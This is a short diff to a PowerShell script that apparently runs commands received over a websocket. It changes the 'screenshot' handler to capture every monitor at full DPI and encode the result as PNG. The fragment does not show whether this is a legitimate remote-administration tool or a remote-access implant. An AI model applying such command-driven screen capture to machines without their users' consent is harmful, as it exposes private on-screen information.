@@ -141,11 +141,23 @@ while ($ws.State -eq "Open") {
             elseif ($cmd.type -eq "screenshot") {
                 Add-Type -AssemblyName System.Windows.Forms
                 Add-Type -AssemblyName System.Drawing
+                Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class DPI {
+    [DllImport("user32.dll")]
+    public static extern bool SetProcessDPIAware();
+}
+"@
+                [DPI]::SetProcessDPIAware()
 
-                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+                $bounds = [System.Drawing.Rectangle]::Empty
+                foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
+                    $bounds = [System.Drawing.Rectangle]::Union($bounds, $screen.Bounds)
+                }
+                $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+                $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
 
                 $ms = New-Object System.IO.MemoryStream
                 $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
